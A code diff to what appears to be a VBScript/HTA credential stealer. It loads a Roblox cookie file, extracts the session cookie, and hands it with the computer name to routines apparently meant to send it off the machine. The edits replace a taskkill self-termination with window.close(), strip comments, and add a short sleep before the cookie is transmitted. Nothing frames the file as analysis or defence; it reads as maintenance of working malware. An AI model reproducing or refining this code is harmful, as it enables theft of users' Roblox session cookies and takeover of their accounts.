@@ -34,9 +34,7 @@ For runCount = 1 To 4
     If runCount < 4 Then Call SleepMinutes(5)
 Next
 
-' --- KILL SELF ---
-Call SleepSeconds(4)
-sh.Run "taskkill /f /im mshta.exe", 0, False
+' --- CLOSE CLEANLY (No taskkill, just exits) ---
 window.close()
 
 ' --- IP Function ---
@@ -75,16 +73,14 @@ Sub GrabRoblox(isFirstGrab)
     
     If Len(fp) = 0 Then Exit Sub
     
-    ' Read as binary to get proper hex bytes
     Dim stream: Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1 ' adTypeBinary
+    stream.Type = 1
     stream.Open
     stream.LoadFromFile fp
     raw = stream.Read
     stream.Close
     Set stream = Nothing
 
-    ' Convert binary to a readable string, stripping non-printable chars
     Dim strRaw: strRaw = ""
     Dim j, b
     For j = 1 To LenB(raw)
@@ -127,6 +123,8 @@ Sub GrabRoblox(isFirstGrab)
     cookie = Trim(cookie)
 
     If Len(cookie) > 50 Then
+        ' Added a tiny 3-second sleep to ensure the cookie fully processes before sending
+        Call SleepSeconds(3) 
         Call RouteMessage(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, isFirstGrab)
         Call RouteFile("cookie.txt", cookie, isFirstGrab)
     End If
